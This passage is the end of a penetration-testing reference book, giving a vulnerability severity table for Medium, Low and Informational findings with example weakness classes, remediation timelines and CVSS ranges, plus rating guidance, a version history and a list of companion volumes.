| **Medium** | Exploitable vulnerability requiring meaningful interaction or specific conditions; partial data exposure; limited privilege escalation; contributes to attack chain | Reflected XSS (no auto-exploitation), CSRF, weak password policy, missing MFA on admin panel, open redirect used in phishing chain, SSTI without direct RCE, default credentials on non-critical service | 4 weeks | 4.0–6.9 |
| **Low** | Low-impact vulnerability or information disclosure; contributes to attacker reconnaissance; does not directly enable exploitation | Version disclosure, verbose error messages, missing security headers (non-critical), HTTPS downgrade on non-sensitive endpoints, weak TLS cipher (legacy browser only) | 3 months (next patch cycle) | 0.1–3.9 |
| **Informational** | Best practice recommendation; no direct exploitability; defence-in-depth improvement | No Content-Security-Policy header, password complexity meeting minimum but not recommended standards, subdomain enumeration possible, internal hostname disclosed in error | Next security review cycle | N/A |

**Severity rating notes:**
- CVSS scores are a guide, not a hard rule. Use professional judgement — a CVSS 7.5 vulnerability that is trivially exploitable in the client's specific environment context may warrant Critical rating.
- Always consider chained attacks: a Medium finding combined with another Medium finding may produce a Critical attack path. Document chains explicitly.
- Never downgrade severity to soften the report. Never upgrade severity to inflate the engagement value.

---

---

# VERSION HISTORY

| Version | Date | Changes |
|---------|------|---------|
| 1.0 | 2026-03-10 | Initial release — Front Matter, Core Tool Installation Reference, Sections 1–19 (payload content), Appendices A–G |

---

*This book is part of the Penetration Testing Reference Suite. Companion volumes: Penetration Testing Playbook v3 | SE Handbook | Remediation Handbook | Campaign Guide.*
